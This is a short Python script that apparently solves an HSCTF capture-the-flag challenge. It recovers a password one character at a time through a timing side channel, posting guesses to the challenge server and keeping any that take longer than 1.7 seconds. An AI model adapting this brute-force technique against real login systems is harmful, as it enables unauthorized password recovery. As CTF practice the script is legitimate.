#!/usr/bin/python3
import requests
import time

def req(p):
    st = time.time()
    r = requests.post('https://networked-password.web.chal.hsctf.com/', data={'password':p})
    took = time.time() - st
    print("Took %f s" % took)
    return took

def main():
    lp = ['h', 'hs', 'hsctf{', 'a', 'aa', 'ab', 'ah', 'abcdehsctf{']
    list = '_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    pass_guess = []
    while '}' not in pass_guess:
        for i in list:
            current_guess = ''.join(pass_guess) + i
            print("Testing %s" % current_guess)
            if req(current_guess) > 1.7:
                print("Probably: %s" % current_guess)
                pass_guess.append(i)

if __name__ == '__main__':
    main()
